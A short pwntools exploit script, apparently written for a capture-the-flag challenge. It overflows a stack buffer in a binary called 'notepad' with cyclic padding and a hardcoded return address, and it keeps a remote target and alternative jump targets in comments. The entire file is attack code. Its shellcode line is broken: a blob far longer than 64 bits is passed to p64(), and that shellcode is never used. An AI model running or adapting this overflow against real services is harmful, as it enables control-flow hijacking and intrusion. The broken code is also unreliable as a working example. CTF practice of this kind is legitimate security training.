from pwn import *

p = process("./notepad")
# p = remote("140.115.59.7", 11002)
print(p.recv())
raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
padding = "A" * cyclic_find("aabnaabo")

# RET = p64(0x4004ee)

# RIP = p64(0x4242424243434343)
# RIP = p64(0x7fff98f40660)
RIP = p64(0x7fff98f406f0)
shellcode = p64(0x48B848454C4C4F09000048BB00000000000100004801D85048C7C7010000004889E648C7C20600000048C7C0010000000F0548C7C03C00000048C7C7000000000F05)

# show_me_magic
# RIP = p64(0x400627)

# frame_dummy
# RIP = p64(0x400620)

p.sendline("hi\x00" + padding + RIP)
p.interactive()